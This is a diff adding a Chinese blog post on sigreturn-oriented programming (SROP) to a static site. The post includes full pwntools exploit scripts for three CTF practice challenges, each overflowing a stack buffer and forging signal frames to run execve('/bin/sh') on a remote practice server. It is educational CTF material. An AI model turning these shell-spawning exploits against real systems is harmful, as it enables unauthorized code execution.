@@ -155,6 +155,129 @@
   
   
    <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/17/SROP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_1.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/17/SROP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">SROP学习总结</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-01-17 18:52:39 / Modified: 18:53:39" itemprop="dateCreated datePublished" datetime="2025-01-17T18:52:39+08:00">2025-01-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>​	<code>ROP(Return Oriented Programming)</code>是利用程序中的一系列<code>ret</code>指令来构造恶意代码执行链。而<code>SROP</code>即利用<code>sigreturn</code>函数完成以上内容。</p>
+<p>这里放一张我看其他师傅博客上的一张图，完成一次系统调用的过程如下：</p>
+<p><img src="C:\Users\guan\AppData\Roaming\Typora\typora-user-images\image-20240122163354902.png" alt="image-20240122163354902"></p>
+<p>①：用户态进程接收到信号<code>signal</code>，该进程被挂起，进入内核态。</p>
+<p>②：内核保存用户态进程的上下文，然后跳转到用户态的信号<code>signal</code>对应的信号处理程序，回到用户态。在这一阶段里，内核会构造一个位于用户栈上的<code>Signal Frame</code>用于存放该进程的上下文，然后再<code>push</code>返回地址<code>rt_sigreturn</code>。</p>
+<p>③：用户态的信号处理程序执行完毕，<code>pop</code>返回地址<code>rt_sigreturn</code>，进程进入内核态，执行<code>sigreturn</code>系统调用。内核根据之前栈上的<code>Signal Frame</code>完成用户态进程上下文的恢复。</p>
+<p>④：返回用户态，进程按照恢复的上下文继续执行。</p>
+<p>​	<code>SROP</code>作用于第3阶段，也就是内核根据<code>Signal Frame</code>的内容恢复进程上下文的过程。</p>
+<p>​	<code>Signal Frame</code>（类似下面这张图）是一个已知的数据结构，而且其存在于用户态的栈上。内核在恢复上下文时并不能确保其内容没有被修改过。因此，如果我们能够在栈上构造<code>sigreturn</code>系统调用与新的<code>Signal Frame</code>结构体的话，就能够实现攻击的效果。</p>
+<p><img src="C:\Users\guan\AppData\Roaming\Typora\typora-user-images\image-20240122203103809.png" alt="image-20240122203103809"></p>
+<p>​	<code>sigreturn</code>函数用于从信号处理程序中恢复到原始的系统调用状态，调用号为<code>0xf</code>，通过<code>syscall</code>指令直接调用。在<code>x86-64</code>架构的<code>Linux</code>系统中，<code>syscall</code>指令的调用号存储在寄存器<code>rax</code>中。</p>
+<h2 id="srop的做题条件"><a href="#srop的做题条件" class="headerlink" title="srop的做题条件"></a><code>srop</code>的做题条件</h2><ul>
+<li>一定要能调用<code>sigreturn</code>，也就是说程序中要有<code>syscall</code>的指令并知道其地址，还需要让<code>rax</code>寄存器值为<code>0xf</code>。</li>
+<li>必须要能知道<code>/bin/sh</code>在程序中的地址。</li>
+</ul>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a><code>ciscn_2019_es_7</code></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	系统调用了<code>sys_read</code>和<code>sys_write</code>，并且可以溢出<code>0x400-0x10</code>个字节</p>
+<p><img src="C:\Users\guan\AppData\Roaming\Typora\typora-user-images\image-20240122163539371.png" alt="image-20240122163539371"></p>
+<p>​	我们看到<code>mov rax,0fh;retn</code>的<code>gadget</code>，<code>0fh</code>是<code>sigreturn</code>函数的调用号，可以用<code>SROP</code>。</p>
+<p><img src="C:\Users\guan\AppData\Roaming\Typora\typora-user-images\image-20240122152721309.png" alt="image-20240122152721309"></p>
+<p>​	程序中没有<code>/bin/sh</code>，我们可以在<code>sys_read(0,buf,0x400ull)</code>这一过程中先把<code>/bin/sh</code>写到<code>buf</code>中，然后<code>sys_write(1u,buf,0x30ull)</code>这一过程会把<code>buf</code>及后面的内容共<code>0x30</code>个字节打印出来，这样我们就可以泄漏一个栈地址，然后计算其与<code>/bin/sh</code>的地址的偏移，表示出<code>/bin/sh</code>的地址。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line">binsh_addr = one_addr-<span class="number">0x148</span></span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br></pre></td></tr></table></figure>
+
+<p>​	得到<code>/bin/sh</code>的地址后，构造一个<code>execve</code>的<code>signal frame</code>，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve  <span class="comment">#execve的系统调用号</span></span><br><span class="line">frame.rdi = binsh_addr  <span class="comment">#第一个参数</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#第二个参数</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#第三个参数</span></span><br><span class="line">frame.rip = syscall_addr  <span class="comment">#下面解释</span></span><br></pre></td></tr></table></figure>
+
+<p>​	首先我们要知道，<code>rip</code>是一个指令指针的寄存器，也就是说<code>rip</code>寄存器中存放的是要执行的下一条指令的地址。而<code>frame.rip</code>中存放的是 当<code>sigreturn</code>系统调用返回后要执行的下一条指令的地址。这里的<code>frame.rip = syscall_leave_ret</code>就表示我们将要执行<code>syscall</code>指令，又因为我们已经设置了<code>execve</code>的<code>signal frame</code>，所以我们就控制了程序的执行流执行<code>execve</code>系统调用。</p>
+<p>​	构造第二个<code>payload</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr)  <span class="comment">#sigreturn的调用号是0xf</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>​	一开始我把<code>payload = payload = b&#39;/bin/sh\x00&#39;.ljust(16,b&#39;\x00&#39;)</code>写成<code>payload = b&#39;a&#39;*16</code>打不通。调试的时候发现，<code>vuln</code>函数是又被循环了一次，这个<code>payload</code>是会往<code>buf</code>中写覆盖原来的内容，也就是说我们上面泄漏的地址<code>binsh_addr</code>，中的内容会变成这次发送的前<code>8</code>个字节。所以我们构造的<code>payload</code>的前<code>8</code>个字节必须是<code>/bin/sh\x00</code>。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26868</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./es7&#x27;)</span></span><br><span class="line">context.arch =<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x148</span></span><br><span class="line">binsh_addr = one_addr-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="comment">#0x148是本地的偏移量，远程的应该是0x118，本地与远程的libc不同</span></span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_addr </span><br><span class="line"></span><br><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr) </span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="C:\Users\guan\AppData\Roaming\Typora\typora-user-images\image-20240122171324394.png" alt="image-20240122171324394"></p>
+<h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a><code>rootersctf_2019_srop</code></h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>​	我们分析代码，发现连<code>main</code>函数都没有，整个程序就是先<code>call 0x401000</code>，然后<code>exit</code>退出。</p>
+<p><img src="C:\Users\guan\AppData\Roaming\Typora\typora-user-images\image-20240206133317497.png" alt="image-20240206133317497"></p>
+<p>​	跳到地址为<code>0x401000</code>这里，分析汇编代码，<code>2</code>个系统调用，<code>write(1,buf,0x2a),read(0,rsp-0x40,0x400)</code>。</p>
+<p><img src="C:\Users\guan\AppData\Roaming\Typora\typora-user-images\image-20240206132903020.png" alt="image-20240206132903020"></p>
+<p>​	程序中没有<code>/bin/sh</code>，所以我们要先往一个地址中写入<code>/bin/sh</code>。如果我们直接写入<code>/bin/sh</code>再<code>srop</code>，我们不能知道<code>/bin/sh</code>的地址，所以可以先栈迁移到<code>data</code>段，<code>data</code>段的地址已知且不变，这样我们就拿到<code>/bin/sh</code>的地址了，设置<code>read</code>的一些寄存器值，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  <span class="comment">#read的系统调用号</span></span><br><span class="line">frame.rdi = <span class="number">0</span>  <span class="comment">#标准输入</span></span><br><span class="line">frame.rsi = buf_addr  <span class="comment">#写入的位置的起始地址</span></span><br><span class="line">frame.rdx = <span class="number">0x400</span>  <span class="comment">#可以写入的字节个数</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#syscall系统调用read</span></span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br></pre></td></tr></table></figure>
+
+<p>不过这里<code>frame.rbp = buf_addr+0x20</code>的作用是什么？）</p>
+<p>​	然后我们可以构造第一个<code>payload</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line"><span class="comment"># srop to call read, set *data_addr = /bin/sh\x00</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br></pre></td></tr></table></figure>
+
+<p>​	上面构造的<code>signal frame</code>再次<code>syscall</code>了一个<code>read</code>系统调用，下面我们就可以往<code>buf_addr = 0x402000</code>里写入<code>/bin/sh</code>，并再次构造一个<code>signal frame</code>系统调用<code>execve</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  <span class="comment">#execve的系统调用号</span></span><br><span class="line">frame.rdi = buf_addr  <span class="comment">#/bin/sh的地址</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#第二个参数</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#第三个参数</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#</span></span><br><span class="line"><span class="comment">#frame.rbp =   #没有rbp了</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./srop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26592</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span> </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = buf_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = buf_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="C:\Users\guan\AppData\Roaming\Typora\typora-user-images\image-20240206160012074.png" alt="image-20240206160012074"></p>
+<h2 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a><code>360chunqiu2017_smallest</code></h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>我们每次控制寄存器的时候，都把<code>rsp</code>写成下一个片段的<code>rt_sigreturn</code>的地址，并且<code>rip</code>的地址要指向<code>syscall；ret</code> 一定要后面有<code>ret</code>，不然所有的片段连不起来，到<code>ret</code>的时候，就会去执行<code>rsp</code>执行的地址，因此我们就可以一直劫持程序的控制流。</p>
+<p>​	程序很简单，只有下面一个函数，分析一下代码就是一个<code>read</code>系统调用，可以栈溢出并且能够溢出的字节数很长。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;retaddr, <span class="number">0x400</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\guan\AppData\Roaming\Typora\typora-user-images\image-20240207130130852.png" alt="image-20240207130130852"></p>
+<p>​	这道题既然是用<code>srop</code>，那么必然是需要能够调用<code>sigreturn</code>，也就是需要把<code>rax</code>寄存器的值设置为<code>0xf</code>。我们发现并没有能够实现这个的相关的<code>gadget</code>，但是我们突然想到<code>read</code>返回值就是存储在<code>rax</code>寄存器中的，我们可以利用这个来设置<code>rax</code>寄存器的值。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line"><span class="comment">#第一个start去让第一次正常运行的ret返回到start</span></span><br><span class="line"><span class="comment">#第二个start让\xB3输入进来，此时去改变了栈顶的start，此时它跳过了xor rax,rax，并</span></span><br><span class="line"><span class="comment">#且它的下面还有一个start</span></span><br><span class="line"><span class="comment">#最下面的start是让我们可以再输入frame，一直控制程序执行流</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span><span class="comment">#减去0x2000，把payload写到该地址</span></span><br></pre></td></tr></table></figure>
+
+<p><code>exp</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29210</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./smallest&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = target_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_ret_addr  </span><br><span class="line">frame.rsp = target_addr  </span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">binsh_addr = target_addr+<span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  </span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_ret_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="C:\Users\guan\AppData\Roaming\Typora\typora-user-images\image-20240219151202950.png" alt="image-20240219151202950"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/08/git%E6%97%B6%E5%87%BA%E7%8E%B0%E2%80%9CPlease-make-sure-you-have-the-correct-access-rights-and-the-repository-exists-%E2%80%9D/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1257,7 +1380,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">10</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1270,7 +1393,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
